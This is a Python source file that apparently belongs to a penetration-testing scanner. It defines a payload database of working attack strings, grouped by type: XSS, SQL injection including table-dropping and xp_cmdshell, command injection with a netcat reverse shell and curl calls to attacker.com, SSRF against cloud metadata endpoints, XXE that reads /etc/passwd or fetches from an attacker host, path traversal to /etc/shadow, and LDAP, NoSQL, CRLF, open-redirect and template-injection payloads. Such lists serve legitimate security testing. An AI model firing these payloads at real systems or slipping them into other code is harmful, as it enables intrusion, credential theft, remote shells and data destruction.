"""
Extensive Payload Database for Vulnerability Testing
Contains payloads for various vulnerability types
"""

class PayloadDatabase:
    """Comprehensive payload database for penetration testing"""

    # XSS Payloads - Extensive collection
    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",

        # Advanced XSS
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<iframe src=javascript:alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<select autofocus onfocus=alert('XSS')>",
        "<textarea autofocus onfocus=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",

        # DOM-based XSS
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "<svg><script>alert('XSS')</script></svg>",

        # Filter bypass XSS
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<script/src=data:,alert('XSS')>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
        "<IMG SRC=\"javascript:alert('XSS')\">",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert('XSS')`>",

        # Event handler XSS
        "<BODY ONLOAD=alert('XSS')>",
        "<BODY ONMOUSEOVER=alert('XSS')>",
        "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
        "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",

        # Encoded XSS
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",

        # Polyglot XSS
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
    ]

    # SQL Injection Payloads
    SQLI_PAYLOADS = [
        # Basic SQLi
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",

        # Union-based SQLi
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "' UNION SELECT username,password FROM users--",

        # Time-based blind SQLi
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "'; WAITFOR DELAY '00:00:05'--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND BENCHMARK(5000000,MD5('A'))--",

        # Boolean-based blind SQLi
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND '1'='1",
        "1' AND '1'='2",

        # Error-based SQLi
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",

        # Stacked queries
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; INSERT INTO users VALUES('hacker','pass')--",

        # Advanced bypass
        "' OR '1'='1' AND 'admin'='admin",
        "' OR '1'/*comment*/='1",
        "' /**/OR/**/ '1'='1",
        "' /*!50000OR*/ '1'='1",
        "' %23%0A OR '1'='1",
    ]

    # Command Injection Payloads
    COMMAND_INJECTION_PAYLOADS = [
        # Basic command injection
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "; id",
        "| id",
        "& id",
        "&& id",
        "; whoami",
        "| whoami",

        # Advanced command injection
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; curl http://attacker.com",
        "| curl http://attacker.com",
        "; wget http://attacker.com",
        "; nc -e /bin/sh attacker.com 4444",

        # Command injection with encoding
        "%0A ls",
        "%0A id",
        "%0A whoami",
        "%0D%0A ls",
        "`ls`",
        "$(ls)",
        "${IFS}ls",

        # Windows command injection
        "& dir",
        "| dir",
        "&& dir",
        "|| dir",
        "; dir",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| ipconfig",

        # Blind command injection
        "; sleep 5",
        "| sleep 5",
        "& ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
        "; ping -n 5 127.0.0.1",
        "& timeout 5",
    ]

    # SSRF Payloads
    SSRF_PAYLOADS = [
        # Internal network
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://127.1",
        "http://127.0.1",
        "http://2130706433",  # 127.0.0.1 in decimal
        "http://0x7f000001",  # 127.0.0.1 in hex

        # Private IP ranges
        "http://192.168.0.1",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",

        # Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/api/token",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",

        # Protocol wrappers
        "file:///etc/passwd",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "dict://127.0.0.1:11211/stats",
        "gopher://127.0.0.1:25/",
        "ldap://127.0.0.1:389",

        # DNS rebinding
        "http://spoofed.burpcollaborator.net",
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",

        # Bypass filters
        "http://127.0.0.1@attacker.com",
        "http://attacker.com#@127.0.0.1",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        "http://0x7f.0x0.0x0.0x1",
        "http://127.0.0.1:80@attacker.com:80/",
    ]

    # XXE Payloads
    XXE_PAYLOADS = [
        # Basic XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",

        # XXE with SYSTEM
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<foo>&xxe;</foo>""",

        # XXE with parameter entity
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo></foo>""",

        # Blind XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<foo></foo>""",

        # XXE via SOAP
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>&xxe;</soap:Body>
</soap:Envelope>""",

        # XXE with PHP wrapper
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>""",
    ]

    # Path Traversal Payloads
    PATH_TRAVERSAL_PAYLOADS = [
        # Basic traversal
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "../../../../../../",
        "../../../../../../../",
        "../../../../../../../../",

        # Absolute paths
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",

        # Encoded traversal
        "..%2F",
        "..%252F",
        "..%5C",
        "..%255C",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%252f",
        "..%c0%af",

        # Double encoding
        "..%252f",
        "..%c0%af",
        "..%c1%9c",

        # Unicode encoding
        "..\\u2216",
        "..\\u2215",

        # Null byte
        "../../../etc/passwd%00",
        "../../../../../../etc/passwd%00",

        # With filename
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "../../../../boot.ini",
        "../../windows/win.ini",
    ]

    # LDAP Injection Payloads
    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*)(&",
        "*)(uid=*",
        "admin*",
        "*)(uid=*))(&(uid=*",
        "*)(|(uid=*))",
        "*()|(&",
        "*)(objectClass=*",
        "*)(objectClass=*))(&(objectClass=*",
        "admin)(&(password=*))",
        "*)(cn=*)",
        "*))(|(cn=*",
    ]

    # NoSQL Injection Payloads
    NOSQL_INJECTION_PAYLOADS = [
        # MongoDB
        "{'$gt':''}",
        "{'$ne':''}",
        "{'$regex':'.*'}",
        "{$gt: ''}",
        "{$ne: null}",
        "{$regex: '.*'}",
        "admin'||'1==1",
        "[$ne]",
        "{'$where': 'sleep(1000)'}",

        # JSON payloads
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt":""}, "password": {"$gt":""}}',
        '{"username": {"$regex":".*"}, "password": {"$regex":".*"}}',
    ]

    # Open Redirect Payloads
    OPEN_REDIRECT_PAYLOADS = [
        "//evil.com",
        "//google.com",
        "///evil.com",
        "////evil.com",
        "https://evil.com",
        "http://evil.com",
        "//evil.com/%2f..",
        "/\\evil.com",
        "//evil.com%2f..",
        "//evil.com%5c..",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "/redirect?url=//evil.com",
        "///\\/evil.com",
        "////\\\\/evil.com",
    ]

    # CRLF Injection Payloads
    CRLF_INJECTION_PAYLOADS = [
        "%0d%0aSet-Cookie:session=malicious",
        "%0d%0aLocation: http://evil.com",
        "%0aSet-Cookie:admin=true",
        "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",
        "%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>",
        "\\r\\nSet-Cookie:session=admin",
        "%0d%0a%0d%0a<script>alert('XSS')</script>",
    ]

    # SSTI (Server-Side Template Injection) Payloads
    SSTI_PAYLOADS = [
        # Jinja2
        "{{7*7}}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

        # Twig
        "{{7*7}}",
        "{{_self.env.display('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}",

        # Freemarker
        "${7*7}",
        "{{7*7}}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",

        # Velocity
        "#set($x=7*7)$x",
        "#set($s=$class.inspect('java.lang.Runtime').type.getRuntime())$s.exec('id')",

        # ERB (Ruby)
        "<%= 7*7 %>",
        "<%= File.read('/etc/passwd') %>",
        "<%= system('id') %>",
    ]

    @classmethod
    def get_all_payloads(cls, vuln_type):
        """Get all payloads for a specific vulnerability type"""
        payload_map = {
            'xss': cls.XSS_PAYLOADS,
            'sqli': cls.SQLI_PAYLOADS,
            'cmd_injection': cls.COMMAND_INJECTION_PAYLOADS,
            'ssrf': cls.SSRF_PAYLOADS,
            'xxe': cls.XXE_PAYLOADS,
            'path_traversal': cls.PATH_TRAVERSAL_PAYLOADS,
            'ldap_injection': cls.LDAP_INJECTION_PAYLOADS,
            'nosql_injection': cls.NOSQL_INJECTION_PAYLOADS,
            'open_redirect': cls.OPEN_REDIRECT_PAYLOADS,
            'crlf_injection': cls.CRLF_INJECTION_PAYLOADS,
            'ssti': cls.SSTI_PAYLOADS,
        }
        return payload_map.get(vuln_type.lower(), [])
